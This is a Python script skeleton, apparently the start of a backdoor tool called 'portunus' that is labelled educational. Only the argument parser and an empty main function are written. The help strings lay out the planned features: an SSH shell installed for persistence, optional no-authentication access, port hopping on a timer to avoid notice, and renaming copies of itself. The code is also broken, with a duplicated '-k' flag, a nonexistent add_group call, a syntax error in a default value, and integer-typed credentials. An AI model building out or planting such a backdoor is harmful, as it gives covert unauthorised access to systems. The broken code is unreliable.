import argparse
import paramiko

"""
portunus makes and managages sshable port on a system in order to gain persistence
**NOTE** this is for educational purposes only **NOTE**
author:     1nv8rZim
language:   python 3.8
"""


def parse_args():
    """
    Parses command line arguments
    """
    parser = argparse.ArgumentParser()
    auth = parser.add_mutually_exclusive_group(
        description="creates a backdoor to install on a system to gain persistence")
    auth.add_argument('-k', '--key', nargs=1, type=str,
                      help='enable ssh-key authentication')
    user_pass = auth.add_group()
    user_pass.add_argument('-u', '--user', nargs=1,
                           type=int, help='add ssh authentication username')
    user_pass.add_argument('-p', '--pass', nargs=1,
                           type=int, help='add ssh authentication password')
    auth.add_argument('--none', action='store_true',
                      help='ssh authentication will use nothing', default=False)
    parser.add_argument('-k', '--key', type=str, nargs=1,
                        help='randomization key for which port location of ssh will be open', default=False)
    parser.add_argument('-r', '--range', type=int, nargs=2, help='range of ports the ssh shell wil be hosted on', default=*(49152, 65535))
    parser.add_argument('-t', '--time', type=int, nargs=1,
                        help='time (in minutes) between when the shell will change port locations', default=3600)
    parser.add_argument('-n', '--name', type=str, nargs=1,
                        help='name of program when getting duplicated', default='portunus.py')
    return parser.parse_args()


def main():
    """
    Runs main loop
    """
    parser = parse_args()
